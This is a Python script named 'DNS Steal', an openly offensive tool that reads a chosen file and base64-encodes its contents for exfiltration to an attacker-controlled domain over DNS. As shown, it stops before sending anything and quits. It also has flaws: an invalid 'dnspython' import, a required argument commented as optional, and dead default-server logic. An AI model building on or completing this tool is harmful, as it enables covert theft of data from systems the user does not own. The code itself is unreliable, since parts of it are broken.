import dnspython
import os
import argparse
import base64
from datetime import datetime

# declare constants
DEFAULT_DNS_IP = "8.8.8.8" # default use Google DNS server
LOG_ERROR_TARGET_FILE = "errors.txt"

# initialize the logging file
logError = ""
currentTimeObject= datetime.now()
currentTimestamp = currentTimeObject.timestamp()
logError = str(currentTimestamp) + "\n"

# import arguments from the command line
parser = argparse.ArgumentParser(description="DNS Steal")

parser.add_argument("-d", "--domain", type=str, required=True, help="Attacker-controlled domain") # the domain field is required
parser.add_argument("-f", "--file", type=str, required=True, help="file path of file to exfiltrate") #the file field is required
parser.add_argument("-s", "--server", type=str, required=True, help="DNS server [IP] for querying") #this is optional

cliArguments = parser.parse_args()

if (cliArguments.server):
    dnsServer = cliArguments.server
else:
    dnsServer = DEFAULT_DNS_IP

fileWithExfilData = cliArguments.file

attackerDomain = cliArguments.domain

# open the file containing data to exfil
data = ""
try:
    if os.path.exists(fileWithExfilData):
        fileStream = open(fileWithExfilData, "r") #open the file in READ ONLY mode to prevent corruption
        data = fileStream.read()
    else:
        logError = logError + "Data target file does not exist. \n"
except:
    logError = logError + "Unknown error occurred while attempting to access the target data file. \n"

# convert the data to Base64 strings
# first encode to ASCII to strip characters that can't be base64 encoded
dataSimplified = data.encode("ascii") 
dataBase64Bytes = base64.b64encode(dataSimplified)
dataEncoded = dataBase64Bytes.decode("ascii")

# remove padding of equal signs (=), if any exist. 
# most base64 decoders can decode just fine without the padding.
while dataEncoded[-1] == "=":
    dataEncoded = dataEncoded[:-1]

# write out error log 
with open(LOG_ERROR_TARGET_FILE, "a") as fileStreamError:
  fileStreamError.write(logError)

quit()